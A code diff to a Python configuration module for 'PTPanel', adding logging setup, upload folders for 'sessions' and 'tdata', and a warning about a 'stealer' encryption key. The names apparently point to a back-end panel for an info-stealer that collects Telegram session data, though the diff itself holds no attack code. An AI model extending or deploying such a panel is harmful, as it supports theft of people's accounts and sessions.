@@ -1,14 +1,27 @@
 import os
 import logging
+import sys
 from dataclasses import dataclass
-from typing import List, Optional, Dict, Any
+from typing import List, Optional
 
-# Завантажи .env файл ПЕРШ ніж що-небудь інше
-from dotenv import load_dotenv
-load_dotenv()
+# Fix Unicode encoding for Windows
+if sys.platform == "win32":
+    import codecs
+    if hasattr(sys.stdout, 'buffer'):
+        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
+    if hasattr(sys.stderr, 'buffer'): 
+        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
 
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('logs/app.log', encoding='utf-8'),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+
 logger = logging.getLogger(__name__)
 
 @dataclass
@@ -60,6 +73,8 @@ class PathConfig:
     static_dir: str = "static"
     uploads_dir: str = "uploads"
     logs_dir: str = "logs"
+    sessions_dir: str = "uploads/sessions"
+    tdata_dir: str = "uploads/tdata"
 
 @dataclass
 class LoggingConfig:
@@ -71,12 +86,9 @@ class LoggingConfig:
 
 class PTPanelConfig:
     def __init__(self):
-        # Database - використовуємо os.getenv() після load_dotenv()
-        database_url = os.getenv('DATABASE_URL', 'postgresql://postgres:password@localhost:5432/ptpanel')
-        print(f"🎯 PTPanelConfig - Using DATABASE_URL: {database_url}")
-        
+        # Database
         self.db = DatabaseConfig(
-            url=database_url,
+            url=os.getenv('DATABASE_URL', 'postgresql://postgres:password@localhost:5432/ptpanel'),
             echo=os.getenv('DEBUG', 'False').lower() == 'true'
         )
         
@@ -128,6 +140,9 @@ class PTPanelConfig:
         
         # Setup logging
         self._setup_logging()
+        
+        # Print config info
+        self._print_config_info()
     
     def _parse_bot_tokens(self) -> List[str]:
         """Parse bot tokens from environment variable"""
@@ -156,6 +171,9 @@ class PTPanelConfig:
         
         if len(self.server.secret_key) < 16:
             logger.warning("SECRET_KEY is too short. Consider using a longer key.")
+        
+        if len(self.stealer.encryption_key) < 32:
+            logger.warning("ENCRYPTION_KEY is too short. Using default may be insecure.")
     
     def _create_directories(self):
         """Create necessary directories if they don't exist"""
@@ -175,25 +193,40 @@ class PTPanelConfig:
         """Setup application logging"""
         import logging.handlers
         
+        # Create logger
         logger = logging.getLogger('ptpanel')
         logger.setLevel(getattr(logging, self.logging.level))
         
+        # Remove existing handlers
         for handler in logger.handlers[:]:
             logger.removeHandler(handler)
         
+        # Formatter
         formatter = logging.Formatter(self.logging.format)
         
+        # File handler with UTF-8 encoding
         file_handler = logging.handlers.RotatingFileHandler(
             self.logging.file,
             maxBytes=self.logging.max_bytes,
-            backupCount=self.logging.backup_count
+            backupCount=self.logging.backup_count,
+            encoding='utf-8'
         )
         file_handler.setFormatter(formatter)
         logger.addHandler(file_handler)
         
+        # Console handler
         if self.server.debug:
-            console_handler = logging.StreamHandler()
+            console_handler = logging.StreamHandler(sys.stdout)
             console_handler.setFormatter(formatter)
             logger.addHandler(console_handler)
+    
+    def _print_config_info(self):
+        """Print configuration information"""
+        print(f">>> PTPanelConfig - Using DATABASE_URL: {self.db.url}")
+        if not self.telegram.bot_tokens:
+            print(">>> WARNING: No bot tokens configured. Bot features will be disabled.")
+        if self.server.debug:
+            print(">>> WARNING: DEBUG mode is enabled. Do not use in production!")
 
+# Global config instance
 config = PTPanelConfig()
